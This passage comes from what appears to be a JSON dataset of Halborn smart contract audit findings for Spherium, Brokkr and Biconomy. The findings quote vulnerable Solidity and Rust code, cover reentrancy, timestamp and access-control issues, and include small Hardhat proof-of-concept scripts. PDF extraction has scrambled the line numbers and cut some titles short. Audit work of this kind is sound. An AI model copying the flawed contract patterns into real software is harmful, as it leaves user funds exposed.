189 190 191 192 193 194 195 196 197 198 199 200 balance0 = IERC20 ( _token0 ). balanceOf ( address ( this )) ; balance1 = IERC20 ( _token1 ). balanceOf ( address ( this )) ; } uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - ( _reserve0 - amount0Out ) : 0; uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - ( _reserve1 - amount1Out ) : 0; require ( amount0In > 0 || amount1In > 0, ' Spherium : INSUFFICIENT_INPUT_AMOUNT '); { // scope for reserve {0 ,1} Adjusted , avoids stack too deep errors uint balance0Adjusted = balance0 . mul (1000) . sub ( amount0In . mul (3) ); uint balance1Adjusted = balance1 . mul (1000) . sub ( amount1In . mul (3) ); require ( balance0Adjusted . mul ( balance1Adjusted ) >= uint ( _reserve0 ). mul ( _reserve1 ). mul (1000**2) , ' Spherium : K '); } _update ( balance0 , balance1 , _reserve0 , _reserve1 ); emit Swap ( msg . sender , amount0In , amount1In , amount0Out , amount1Out , to ); } // force balances to match reserves function skim ( address to ) external lock { address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings _safeTransfer ( _token0 , to , IERC20 ( _token0 ). balanceOf ( address ( this )) . sub ( reserve0 )) ; _safeTransfer ( _token1 , to , IERC20 ( _token1 ). balanceOf ( address ( this )) . sub ( reserve1 )) ; } // force reserves to match balances function sync () external lock { _update ( IERC20 ( token0 ). balanceOf ( address ( this )) , IERC20 ( token1 ). balanceOf ( address ( this )) , reserve0 , reserve1 ); 201 202 } } 21 Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is recommended to move the initialization of token0 and token1 to constructor() so that it can be called once at the time of deployment by the contract owner. In case to continue with the initialize function, it is recommended to declare the initialize function as internal and the function call should be done within constructor(). Remediation Plan: NOT APPLICABLE: The Spherium team claims that factory contract can initialize the token0 and token1, but it cannot change the token0 and token1 variables for the second time. 22 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "MISSING RE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was identified that core-bsc Contracts are missing nonReentrant guard. In contract SpheriumPair.sol, functions burn, swap, and skim are missing Also, in skim function, read of persistent state nonReentrant guard. following external call is identified, and in burn, swap function, state variables written after the call, making it vulnerable to a Reentrancy attack. To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 6: core-bsc/contracts/SpheriumPair.sol (Lines 194,195) 191 192 193 194 195 196 function skim ( address to ) external lock { address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings _safeTransfer ( _token0 , to , IERC20 ( _token0 ). balanceOf ( address ( this )) . sub ( reserve0 )) ; _safeTransfer ( _token1 , to , IERC20 ( _token1 ). balanceOf ( address ( this )) . sub ( reserve1 )) ; } Risk Level: Likelihood - 1 Impact - 4 23 Recommendation: It is recommended to change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: NOT APPLICABLE: The Spherium team claims that due to their use of lock modifier in pair contract suffice reentrancy protection. 24 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "MULTIPLE CALLS MAY LEADS TO DENIAL OF SERVICE(DOS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In core-bsc contract SpheriumPair.sol multiple calls are executed in the same transaction. This call is executed following another call within the same transaction. It is possible that the call never gets executed if a prior call fails permanently and it may leads to DOS. This might be caused intentionally by a malicious call. Code Location: Listing 7: core-bsc/contracts/SpheriumPair.sol (Lines 194,195,200) 191 192 193 194 195 196 197 198 199 200 201 function skim ( address to ) external lock { address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings _safeTransfer ( _token0 , to , IERC20 ( _token0 ). balanceOf ( address ( this )) . sub ( reserve0 )) ; _safeTransfer ( _token1 , to , IERC20 ( _token1 ). balanceOf ( address ( this )) . sub ( reserve1 )) ; } // force reserves to match balances function sync () external lock { _update ( IERC20 ( token0 ). balanceOf ( address ( this )) , IERC20 ( token1 ). balanceOf ( address ( this )) , reserve0 , reserve1 ); } Risk Level: Likelihood - 1 Impact - 4 25 Recommendation: If possible, refactoring the code such that each transaction only executes one external calls or make sure that all calls can be trusted (i.e. theyre part of your own codebase). Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 26 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "uses Uniswap multiple functions periphery-bsc TransferHelper In safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. In this case both tokens are set in the constructor by the creator of the contract, so they are trusted, but it would be still a good practice to perform this check. Code Location: Listing 8: periphery-bsc/contracts/SpheriumRouter01.sol 1 TransferHelper . safeTransferFrom ( tokenA , msg . sender , pair , amountA ) ; 2 TransferHelper . safeTransferFrom ( tokenB , msg . sender , pair , amountB ) ; 3 TransferHelper . safeTransferFrom ( token , msg . sender , pair , amountToken ); 4 TransferHelper . safeTransferFrom ( path [0] , msg . sender , SpheriumLibrary . pairFor ( factory , path [0] , path [1]) , amounts [0]) ; 5 TransferHelper . safeTransfer ( token , to , amountToken ); Listing 9: periphery-bsc/contracts/SpheriumRouter02.sol 1 TransferHelper . safeTransferFrom ( tokenA , msg . sender , pair , amountA ) ; 27 2 TransferHelper . safeTransferFrom ( tokenB , msg . sender , pair , amountB ) ; 3 TransferHelper . safeTransferFrom ( token , msg . sender , pair , amountToken ); 4 TransferHelper . safeTransferFrom ( path [0] , msg . sender , SpheriumLibrary . pairFor ( factory , path [0] , path [1]) , amounts [0]) ; 5 TransferHelper . safeTransferFrom ( path [0] , msg . sender , SpheriumLibrary . pairFor ( factory , path [0] , path [1]) , amountIn ); 6 TransferHelper . safeTransfer ( token , to , amountToken ); 7 TransferHelper . safeTransfer ( token , to , IERC20 ( token ). balanceOf ( address ( this ))); Recommendations: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 28 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "WEAK PSEUDO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "in of and and use library contract Contract block.timestamp SpheriumPair.sol SpheriumOracleLibrary.sol we noticed the use of now in core-bsc During a manual review, periphery-bsc SpheriumPair.sol function SpheriumOracleLibrary.sol. _update function currentBlockTimestamp uses a weak pseudo random number generator due to a modulo on now and blockTimestamp respectively i.e. uint32(now % 2 ** 32) The contract developers should and uint32(block.timestamp % 2 ** 32). be aware that this does not mean current time. now is an alias for block.timestamp. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 10: core-bsc/contracts/SpheriumPair.sol (Lines 76) 74 75 76 77 function _update ( uint balance0 , uint balance1 , uint112 _reserve0 , uint112 _reserve1 ) private { require ( balance0 <= uint112 ( -1) && balance1 <= uint112 ( -1) , ' Spherium : OVERFLOW '); uint32 blockTimestamp = uint32 ( now % 2**32) ; uint32 timeElapsed = blockTimestamp - blockTimestampLast ; // overflow is desired Listing 11: periphery-bsc/contracts/libraries/SpheriumOracleLibrary.sol (Lines 14) 13 14 15 function currentBlockTimestamp () internal view returns ( uint32 ) { return uint32 ( block . timestamp % 2 ** 32) ; } 29 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Do not use now or blockTimestamp as a source of randomness. Use block .number instead of block.timestamp or now to reduce the risk of MEV attacks. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 30 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "EXTERNAL FUNCTION CALLS WITHIN LOOP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calls inside a loop increase Gas usage or might lead to a denial-of-service attack. In some of the functions discovered there is a for loop on variable i that iterates up to the path.length array length. If this integer is evaluated at extremely large numbers this can cause a DoS. Code Location: Listing 12: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 175) 168 169 170 171 172 173 174 175 176 177 function _swap ( uint [] memory amounts , address [] memory path , address _to ) private { for ( uint i; i < path . length - 1; i ++) { ( address input , address output ) = ( path [i ], path [i + 1]) ; ( address token0 ,) = SpheriumLibrary . sortTokens ( input , output ); uint amountOut = amounts [ i + 1]; ( uint amount0Out , uint amount1Out ) = input == token0 ? ( uint (0) , amountOut ) : ( amountOut , uint (0) ) ; address to = i < path . length - 2 ? SpheriumLibrary . pairFor ( factory , output , path [i + 2]) : _to ; ISpheriumPair ( SpheriumLibrary . pairFor ( factory , input , output )) . swap ( amount0Out , amount1Out , to , new bytes (0) ); } } Listing 13: 232,233,234) periphery-bsc/contracts/SpheriumRouter02.sol (Lines 225 226 function _swap ( uint [] memory amounts , address [] memory path , address _to ) internal virtual { for ( uint i; i < path . length - 1; i ++) { 31 227 228 229 230 231 232 233 234 235 ( address input , address output ) = ( path [i ], path [i + 1]) ; ( address token0 ,) = SpheriumLibrary . sortTokens ( input , output ); uint amountOut = amounts [ i + 1]; ( uint amount0Out , uint amount1Out ) = input == token0 ? ( uint (0) , amountOut ) : ( amountOut , uint (0) ) ; address to = i < path . length - 2 ? SpheriumLibrary . pairFor ( factory , output , path [i + 2]) : _to ; ISpheriumPair ( SpheriumLibrary . pairFor ( factory , input , output )) . swap ( amount0Out , amount1Out , to , new bytes (0) ); } Listing 14: 349,351,356) periphery-bsc/contracts/SpheriumRouter02.sol (Lines 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 function _swapSupportingFeeOnTransferTokens ( address [] memory path , address _to ) internal virtual { for ( uint i; i < path . length - 1; i ++) { ( address input , address output ) = ( path [i ], path [i + 1]) ; ( address token0 ,) = SpheriumLibrary . sortTokens ( input , output ); ISpheriumPair pair = ISpheriumPair ( SpheriumLibrary . pairFor ( factory , input , output )) ; uint amountInput ; uint amountOutput ; { // scope to avoid stack too deep errors ( uint reserve0 , uint reserve1 ,) = pair . getReserves () ; ( uint reserveInput , uint reserveOutput ) = input == token0 ? ( reserve0 , reserve1 ) : ( reserve1 , reserve0 ); amountInput = IERC20 ( input ). balanceOf ( address ( pair )) . sub ( reserveInput ); amountOutput = SpheriumLibrary . getAmountOut ( amountInput , reserveInput , reserveOutput ); } ( uint amount0Out , uint amount1Out ) = input == token0 ? ( uint (0) , amountOutput ) : ( amountOutput , uint (0) ); address to = i < path . length - 2 ? SpheriumLibrary . pairFor ( factory , output , path [i + 2]) : _to ; 32 pair . swap ( amount0Out , amount1Out , to , new bytes (0) ); 356 357 358 } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Reference: External Calls Recommendation Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 33 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "IGNORE RETURN VALUES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The return value of an external call is not stored in a local or state variable. In contract SpheriumRouter01.sol and SpheriumRouter02.sol, there are instances where external methods are being called and return value are being ignored. It was observed that contract SpheriumRouter01.sol and SpheriumRouter02 .sol function _addLiquidity ignores return value by ISpheriumFactory( factory).createPair(tokenA, tokenB). Code Location: Listing 15: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 39) 29 30 31 32 33 34 35 36 37 38 39 40 function _addLiquidity ( address tokenA , address tokenB , uint amountADesired , uint amountBDesired , uint amountAMin , uint amountBMin ) private returns ( uint amountA , uint amountB ) { // create the pair if it doesn 't exist yet if ( ISpheriumFactory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { ISpheriumFactory ( factory ). createPair ( tokenA , tokenB ); } Listing 16: periphery-bsc/contracts/SpheriumRouter02.sol (Lines 56) 46 47 48 49 50 function _addLiquidity ( address tokenA , address tokenB , uint amountADesired , uint amountBDesired , 34 51 52 53 54 55 56 57 uint amountAMin , uint amountBMin ) internal virtual returns ( uint amountA , uint amountB ) { // create the pair if it doesn 't exist yet if ( ISpheriumFactory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { ISpheriumFactory ( factory ). createPair ( tokenA , tokenB ); } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 35 ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Low"]}, {"title": "MISSING ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There are multiple instances found where Address validation is missing. Lack of zero address validation has been found when assigning user supplied address values to state variables directly. In core-bsc contract SpheriumFactory.sol function setFeeTo(address) lacks a zero-check on _feeTo, function setFeeToSetter(address) lacks a zero-check on _feeToSetter, and constructor constructor(address) lacks a zero-check on _feeToSetter. In contract SpheriumPair.sol function initialize(address,address) lacks a zero-check on _token0 and _token1. In periphery-bsc contracts SpheriumRouter01.sol and SpheriumRouter02.sol constructor lacks a zero-check on _factory and _WETH. In governance contract SpheriumToken-TGE.sol function createLGEWhitelist lacks a zero-check on pairAddress. Code Location: Listing 17: core-bsc/contracts/SpheriumFactory.sol (Lines 19) 18 19 20 constructor ( address _feeToSetter ) public { feeToSetter = _feeToSetter ; } Listing 18: core-bsc/contracts/SpheriumFactory.sol (Lines 46) 44 45 46 47 function setFeeTo ( address _feeTo ) external { require ( msg . sender == feeToSetter , ' Spherium : FORBIDDEN '); feeTo = _feeTo ; } Listing 19: core-bsc/contracts/SpheriumFactory.sol (Lines 51) 49 50 function setFeeToSetter ( address _feeToSetter ) external { require ( msg . sender == feeToSetter , ' Spherium : FORBIDDEN '); 36 51 52 } feeToSetter = _feeToSetter ; Listing 20: core-bsc/contracts/SpheriumPair.sol (Lines 69,70) 67 68 69 70 71 function initialize ( address _token0 , address _token1 ) external { require ( msg . sender == factory , ' Spherium : FORBIDDEN '); // sufficient check token0 = _token0 ; token1 = _token1 ; } Listing 21: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 20,21) 19 20 21 22 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Listing 22: periphery-bsc/contracts/SpheriumRouter02.sol (Lines 32,33) 31 32 33 34 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Listing 23: governance/contracts/SpheriumToken-TGE.sol (Lines 389) 382 383 384 385 386 387 388 389 function createLGEWhitelist ( address pairAddress , uint256 [] calldata durations , uint256 [] calldata amountsMax ) external onlyWhitelister () { require ( durations . length == amountsMax . length , \" Invalid whitelist ( s) \" ); _lgePairAddress = pairAddress ; 37 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed to this function due to the OpenZeppelin RBAC it is better to add proper address validation when assigning a value to a variable from user supplied inputs. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 38 3.10 (HAL-10) USAGE OF BLOCK-TIMESTAMP - LOW ", "labels": ["Halborn", "Spherium_Hyperswap", "Severity: Informational"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P3_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Incorrect use of the update_config function in contracts can set the owner to have an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the contract owner can change the owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  rewards  epoch-manager  token-pool Code Location: In the epoch manager contract: Listing 1: contracts/epoch-manager/src/commands.rs (Line 20) 19 if let Some ( owner ) = owner { 20 21 } config . owner = deps . api . addr_canonicalize (& owner ) ?; In the rewards contract: Listing 2: contracts/rewards/src/commands.rs (Line 30) 29 if let Some ( owner ) = owner { 30 31 } config . owner = deps . api . addr_canonicalize (& owner ) ?; 13 In the token-pool contract: Listing 3: contracts/rewards/src/commands.rs (Line 93) 92 if let Some ( owner ) = owner { 93 94 } config . owner = deps . api . addr_canonicalize (& owner ) ?; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split owner transfer functionality into the set_owner and accept_ownership functions. The last function allows the recipient to complete the transfer. Remediation plan: SOLVED: The issue was fixed in commit 79549c38936e99a89a1fa7aa7e38456032f47389. 14 ", "labels": ["Halborn", "Brokkr_Protocol_P3_Contracts_CosmWasm", "Severity: Medium"]}, {"title": "REWARDS SPEND LIMIT CAN BE IGNORED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P3_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The rewards contract has a spend_limit attribute that caps the maximum amount a distributor can spend in a transaction. However, the amount of each distribution message is verified separately instead of checking that the global amount spent is less than the spending limit. That allows a distributor to bypass the restriction in a transaction. Users who interact with the distribute function must be whitelisted first. Therefore, the likelihood of such a scenario is low. Code Location: Listing 4: contracts/rewards/src/commands.rs, (Lines 129-131) return Err ( ContractError :: SpendLimitReached {}) ; } if config . spend_limit < distribution . amount { 127 let mut msgs : Vec < CosmosMsg > = vec! []; 128 for distribution in distributions { 129 130 131 132 133 134 135 136 137 138 139 140 contract : distribution . contract , amount : distribution . amount , msg : distribution . msg , contract_addr : bro_token . clone () , funds : vec! [] , msg : to_binary (& Cw20ExecuteMsg :: Send { msgs . push ( CosmosMsg :: Wasm ( WasmMsg :: Execute { }) ?, Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: It is recommended to compare the total amount spent with the spend_limit. Remediation plan: SOLVED: The issue was fixed in commit a9856345f269ca5275236297feae192d1ee4cec4. 16 ", "labels": ["Halborn", "Brokkr_Protocol_P3_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "LACK OF VALIDATION WHEN UPDATING EPOCH STATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P3_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "When updating the epoch manager status, the owner can set the following attributes:  epochs (number of blocks in an epoch)  blocks_per_year  bbro_emission_rate The absence of validation allows the variables to be set to 0, inducing malfunction in the contracts by querying the epoch-manager: staking-v1 and distributor-v1. For example, epochs with a value of 0 will cause a 0-unverified division in the distributor-v1 contract, and a 0-verified division in the staking-v1 contract, causing transactions to go into panic. However, only an administrator can update these values. Therefore, the likelihood is limited. Code Location: Absence of validation when updating the state value in epoch-manager: Listing 5: contracts/epoch-manager/src/commands.rs, (Line 60) state . epoch = epoch ; 46 let mut state = load_state ( deps . storage ) ?; 47 48 if let Some ( epoch ) = epoch { 49 50 } 51 52 if let Some ( blocks_per_year ) = blocks_per_year { 53 state . blocks_per_year = blocks_per_year ; 17 54 } 55 56 if let Some ( bbro_emission_rate ) = bbro_emission_rate { 57 58 } 59 60 store_state ( deps . storage , & state ) ?; state . bbro_emission_rate = bbro_emission_rate ; In staking-v1, when calling compute_normal_bbro_reward: Listing 6: contracts/staking-v1/src/state.rs, (Line 164) 161 let epoch_info = query_epoch_info ( querier , epoch_manager_contract )  ?; 162 163 let epochs_staked = Uint128 :: from ( state . last_distribution_block -  self . last_balance_update ) 164 . checked_div ( Uint128 :: from ( epoch_info . epoch )) ?; In distributor, when calling distribute: Listing 7: contracts/distributor-v1/src/commands.rs, (Line 44) & deps . querier , deps . api . addr_humanize (& config . epoch_manager_contract )? , 35 // query epoch from epoch_manager contract 36 let epoch_blocks = query_epoch_info ( 37 38 39 )? 40 . epoch ; 41 42 // distribute rewards only for passed epochs 43 let blocks_since_last_distribution = env . block . height - state .  last_distribution_block ; 44 let passed_epochs = blocks_since_last_distribution / epoch_blocks ; 45 if passed_epochs == 0 { 46 47 } return Err ( ContractError :: NoRewards {}) ; 18 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to check the values of the status parameters before storing them. Remediation plan: SOLVED: The issue was fixed in commit 1c7ab7d56ae6ad16c88d8fdfeddb4e3e8e571f85. 19 ", "labels": ["Halborn", "Brokkr_Protocol_P3_Contracts_CosmWasm", "Severity: Informational"]}, {"title": "CONTRACT UPGRADE/INITIALIZATION DROPS MINIMUM DEPOSIT VALUE TO ZERO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "There is a mapping on the GasTank contract where deposited asset amounts are mapped with addresses. The amount of assets deposited on the contract is also kept on this variable. While defining the minDeposit variable, which controls the amount of assets to be sent to the MasterAccount, this value was determined as 1e18 at the contract itself. However, when this value is checked after the contract is initialized or upgraded, it is seen that minDeposit value is dropped to 0. Code Location: Listing 1: DappGasTank.sol (Lines 58) 57 address payable public masterAccount ; 58 uint256 public minDeposit = 1 e18 ; Listing 2: DappGasTank.sol 79 function initialize ( address trustedForwarder ) public initializer { 80 81 82 83 __ERC2771Context_init ( trustedForwarder ); __Ownable_init () ; _initializedVersion = 0; } 13 PoC Code: Hardhat Test Script It is recommended to run the following test script after contract ini- tialization. Listing 3: scripts/halborn-minDeposit.js try { 1 async function main () { 2 3 4 5 6 7 8 9 const owner = \"\" ; // Owner Address const proxyAdmin = \"\" ; // Proxy Admin Address const relayerMasterAccount = \" \" ; // MasterAccount Address const proxyAddress = \" \"; // Proxy Address let gasTankProxy = await hre . ethers . getContractAt ( \" contracts /7/ gas - manager / gas - tank / DappGasTank . sol : DappGasTank \" , proxyAddress ); 10 11 console . log (\" MinDeposit Value : \" + await gasTankProxy . minDeposit () ); } 12 13 14 15 16 } 17 18 main () 19 20 21 22 23 }) ; } catch ( error ) { console . log ( error ); . then (() => process . exit (0) ) . catch ( error => { console . error ( error ); process . exit (1) ; Output: 14 Risk Level: Likelihood - 3 Impact - 4 Recommendations: It is recommended to define a valid number for minDeposit variable while initializing or upgrading the contract. Remediation Plan: SOLVED: The Biconomy Team solved this issue by controlling the minDeposit variable. Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 15 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Medium"]}, {"title": "MISSING ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization of permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. There are multiple important functionalities on DappGasTank.sol, con- tract such as allowing/disabling tokens for transfer, adjusting minimum deposit amount and withdrawing assets. It is important to divide these functionalities into multiple roles. Code Location: Listing 4: Centralized Functions 1 function setMinDeposit ( uint256 _newMinDeposit ) external onlyOwner 2 function setTrustedForwarder ( address payable _forwarder ) external onlyOwner 3 function setMasterAccount ( address payable _newAccount ) external onlyOwner 4 function setTokenAllowed ( address token , bool allowed ) external onlyOwner 5 function withdraw ( uint256 _amount ) public onlyOwner 16 Risk Level: Likelihood - 3 Impact - 3 Recommendations: RESOURCE_SETTER role and onlyResourceSetter modifier should be imple- mented for the following functions to avoid centralization on the con- tract. Listing 5: Asset-Related Functions 1 function setMinDeposit ( uint256 _newMinDeposit ) external onlyOwner 2 function setTokenAllowed ( address token , bool allowed ) external onlyOwner 3 function withdraw ( uint256 _amount ) public onlyOwner Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 17 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Medium"]}, {"title": "OWNER CAN RENOUNCE OWNERSHIP", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Owner of the contract is usually the account which deploys the contract. As a result, the Owner can perform some privileged functions the like transferOwnership(). renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. In DappGasTank.sol smart contract, Code Location: Listing 6: DappGasTank.sol (Lines 55) 55 contract DappGasTank is Initializable , OwnableUpgradeable , ERC2771ContextUpgradeable { PoC Code: Hardhat Test Script Listing 7: scripts/halborn-renounceOwnership.js try { 1 async function main () { 2 3 4 5 6 7 8 9 const owner = \"\" ; // Owner Address const proxyAdmin = \"\" ; // ProxyAdmin Address const relayerMasterAccount = \" \" ; // MasterAccount Address const proxyAddress = \" \"; // Proxy Address let gasTankProxy = await hre . ethers . getContractAt ( \" contracts /7/ gas - manager / gas - tank / DappGasTank . sol : DappGasTank \" , proxyAddress ); 10 18 11 12 13 console . log (\" Owner address before renounceOwnership () method : \" + await gasTankProxy . owner () ); tx = await gasTankProxy . renounceOwnership () ; console . log (\" Owner address after renounceOwnership () method : \" + await gasTankProxy . owner () ); } 14 15 16 17 18 } 19 20 main () 21 22 23 24 25 }) ; } catch ( error ) { console . log ( error ); . then (() => process . exit (0) ) . catch ( error => { console . error ( error ); process . exit (1) ; Output: Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended that the Owner cannot call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 19 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Low"]}, {"title": "LACK OF ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The DappGasTank.sol contract have multiple input fields on their both public and private functions. Some of these inputs are required as address variable. During the test, it has seen all of these inputs are not protected against using the address(0) as the target address. It is not recommended to use zero address as target addresses on the contracts. Code Location: Listing 8: DappGasTank.sol (Lines 79,80) 79 function initialize ( address trustedForwarder ) public initializer { 80 81 82 83 __ERC2771Context_init ( trustedForwarder ); __Ownable_init () ; _initializedVersion = 0; } Listing 9: DappGasTank.sol (Lines 152,153) 152 function setMasterAccount ( address payable _newAccount ) external onlyOwner { 153 154 155 } masterAccount = _newAccount ; emit MasterAccountChanged ( _newAccount , msg . sender ); Risk Level: Likelihood - 3 Impact - 1 20 Recommendations: It is recommended to implement additional address check to detect is current contract getting used as a target address. Listing 10: DappGasTank.sol 79 function initialize ( address trustedForwarder ) public initializer { 80 require ( trustedForwarder != address (0) , \" Trusted Forwarder can not be zero address .\" ) __ERC2771Context_init ( trustedForwarder ); __Ownable_init () ; _initializedVersion = 0; 81 82 83 84 } Listing 11: DappGasTank.sol 152 function setMasterAccount ( address payable _newAccount ) external onlyOwner { 153 154 155 156 } require ( _newAccount != address (0) , \" Master Account can not be zero address .\" ) masterAccount = _newAccount ; emit MasterAccountChanged ( _newAccount , msg . sender ); Remediation Plan: SOLVED: The Biconomy Team solved this issue by implementing zero address checks. Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 21 ", "labels": ["Halborn", "Biconomy_GasTank", "Severity: Low"]}, {"title": "PRAGMA VERSION IS TOO PRIOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The project uses one of the latest pragma version (0.8.0) which was released on 16th of December, 2020. The latest pragma version (0.8.9) Many pragma versions have been lately was released in October 2021. released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. In the Solitidy Github repository, there is a JSON file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Code Location: Listing 12: DappGasTank.sol (Lines 1) 1 pragma solidity ^0.8.0; 2 // SPDX - License - Identifier : MIT Risk Level: Likelihood - 2 Impact - 2 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. 22 References:  Solidity Releases  Solidity Bugs By Version Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 23 ", "labels": 